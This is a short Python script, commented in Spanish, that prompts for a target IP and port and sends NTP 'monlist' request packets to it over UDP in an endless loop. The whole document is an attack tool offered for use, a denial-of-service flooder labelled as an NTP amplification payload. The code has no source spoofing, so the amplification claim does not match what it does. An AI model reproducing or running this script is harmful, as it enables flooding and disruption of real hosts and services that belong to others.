import socket

# Solicitar datos al usuario
target_ip = input("Introduce la IP de destino: ")
target_port = int(input("Introduce el puerto de destino: "))

# Payload para NTP Amplification (comando 'monlist')
ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
    while True:
        sock.sendto(ntp_payload, (target_ip, target_port))
        # Puedes agregar un delay con time.sleep(segundos) si quieres
except KeyboardInterrupt:
    print("\nEnvío detenido por el usuario.")
finally:
    sock.close()
